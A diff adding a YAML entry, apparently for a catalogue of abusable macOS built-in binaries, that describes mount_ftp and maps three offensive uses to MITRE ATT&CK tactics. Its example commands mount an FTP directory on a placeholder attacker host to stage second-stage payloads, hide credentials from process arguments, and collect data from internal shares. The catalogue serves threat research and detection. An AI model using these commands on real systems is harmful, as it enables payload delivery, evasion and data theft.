@@ -1,0 +1,52 @@
+name: mount_ftp
+author: Hare Sudhan (@cyb3rbuff)
+short_description: Mount a remote FTP server directory as a read-only local filesystem.
+full_description: |
+  mount_ftp is the macOS mount helper for the FTP filesystem. It attaches a remote FTP server directory at a
+  local mount point, after which the remote files appear under /Volumes as ordinary local files. The mount is
+  always read-only: the helper forces the rdonly option and cannot write to the server. This gives an
+  operator a native way to stage remote tooling, since files on an FTP server become local files to copy and
+  run without curl or wget. The mount command (mount -t ftp) and Finder's "Connect to Server" drive it, but
+  it also runs directly. Credentials, when required, are passed inside the ftp:// URL, where they appear in
+  process arguments.
+created: 2026-09-20
+example_use_cases:
+  - name: Stage remote tooling onto a host without a downloader utility
+    description: >-
+      Mounting an attacker-controlled FTP directory exposes its files locally, so a second-stage payload
+      hosted there can be copied off the mount and run via the native helper rather than curl or wget. The
+      read-only mount stages files inbound only. The mount point must already exist.
+    code: mount_ftp ftp://<ATTACKER_HOST>/tools /Volumes/mnt
+    tactics:
+      - Command and Control
+    tags: []
+  - name: Prompt for credentials at mount time to keep them off the command line
+    description: >-
+      The -i (interactive) option makes mount_ftp prompt for the username and password instead of reading
+      them from the URL, so credentials for an authenticated FTP drop never appear in the process arguments or
+      shell history. The remote directory is then readable at the mount point.
+    code: mount_ftp -i ftp://<ATTACKER_HOST>/tools /Volumes/mnt
+    tactics:
+      - Command and Control
+      - Defense Evasion
+    tags: []
+  - name: Read files from an internal FTP server discovered during lateral movement
+    description: >-
+      With credentials or anonymous access to an internal FTP server, an operator can mount its directory and
+      copy the contents as local files, collecting data from a network share without an FTP client. Access is
+      read-only, and the mount point must already exist.
+    code: mount_ftp ftp://user:<PASSWORD>@<INTERNAL_HOST>/share /Volumes/mnt
+    tactics:
+      - Lateral Movement
+      - Collection
+    tags:
+      - shares
+paths:
+  - /sbin/mount_ftp
+  - /System/Library/Filesystems/ftp.fs/Contents/Resources/mount_ftp
+detections: []
+resources:
+  - name: "mount_ftp(8) manual page"
+    url: https://keith.github.io/xcode-man-pages/mount_ftp.8.html
+  - name: "MITRE ATT&CK T1105: Ingress Tool Transfer"
+    url: https://attack.mitre.org/techniques/T1105/
